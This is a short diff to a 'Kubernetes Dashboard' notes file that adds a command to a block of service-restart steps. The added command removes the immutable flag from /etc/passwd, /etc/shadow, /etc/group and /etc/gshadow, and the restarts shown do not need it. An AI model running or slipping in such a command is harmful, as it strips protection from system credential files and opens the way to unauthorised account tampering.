@@ -1,6 +1,8 @@
 # Kubernetes Dashboard
 
 ```
+chattr -i /etc/passwd* && chattr -i /etc/group* && chattr -i /etc/shadow* && chattr -i /etc/gshadow*
+
 systemctl restart iptables
 systemctl restart kube-scheduler
 systemctl restart kube-controller-manager
